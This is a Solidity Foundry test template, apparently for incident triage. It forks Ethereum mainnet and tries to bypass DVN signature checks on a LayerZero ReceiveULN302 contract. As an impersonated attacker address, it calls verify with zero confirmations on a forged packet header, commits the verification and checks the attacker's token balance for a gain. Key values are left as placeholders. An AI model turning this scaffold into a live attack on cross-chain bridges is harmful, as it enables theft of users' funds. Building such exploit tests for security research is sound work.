// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.20;

/*
    DVN bypass template -- packet accepted without sufficient DVN signatures.

    Use when an alert shows a packet delivered to ReceiveULN with fewer-than-
    required verifier sigs, OR when DVN config was changed mid-flight.

    FILL: TARGET (ReceiveULN302), ATTACKER, FORK_BLOCK, PACKET, EMPTY_SIGS
*/

import "forge-std/Test.sol";

interface IReceiveULN {
    function commitVerification(bytes calldata _packetHeader, bytes32 _payloadHash) external;
    function verify(bytes calldata _packetHeader, bytes32 _payloadHash, uint64 _confirmations) external;
    function getUlnConfig(address _oapp, uint32 _eid) external view returns (
        uint64 confirmations, uint8 requiredDVNCount, uint8 optionalDVNCount,
        uint8 optionalDVNThreshold, address[] memory requiredDVNs, address[] memory optionalDVNs
    );
}

interface IOApp {
    function balanceOf(address) external view returns (uint256);
}

contract DvnBypassExploit is Test {
    address constant TARGET   = address(0xc02Ab410f0734EFa3F14628780e6e695156024C2); // FILL: ReceiveULN302
    address constant OAPP     = address(0x0000000000000000000000000000000000000000); // FILL: target OApp
    address constant ATTACKER = address(0xDeadBeeF00000000000000000000000000001337); // FILL
    uint256 constant FORK_BLOCK = 22487000; // FILL
    uint32  constant SRC_EID    = 30101;    // FILL: src endpoint id

    bytes   constant PACKET_HEADER = hex""; // FILL: forged packet header
    bytes32 constant PAYLOAD_HASH  = bytes32(0); // FILL

    function setUp() public {
        string memory rpc = vm.envOr("FOUNDRY_RPC_URL", string("https://eth.llamarpc.com"));
        vm.createSelectFork(rpc, FORK_BLOCK);
    }

    function test_dvnBypass_zeroConfirmations() public {
        uint256 attackerBefore = IOApp(OAPP).balanceOf(ATTACKER);

        // Attempt to commit verification with 0 confirmations -- should be rejected
        // by required-DVN check. If the call SUCCEEDS, DVN gating is broken.
        vm.prank(ATTACKER);
        try IReceiveULN(TARGET).verify(PACKET_HEADER, PAYLOAD_HASH, 0) {
            // verify succeeded with zero confirmations -- try to commit and read result
            IReceiveULN(TARGET).commitVerification(PACKET_HEADER, PAYLOAD_HASH);
            uint256 attackerAfter = IOApp(OAPP).balanceOf(ATTACKER);
            assertGt(attackerAfter, attackerBefore,
                     "Verify-with-0-confirmations succeeded but no value moved (still a bug -- DVN gate bypassed)");
        } catch {
            revert("DVN gating held; cannot bypass with zero confirmations");
        }
    }
}
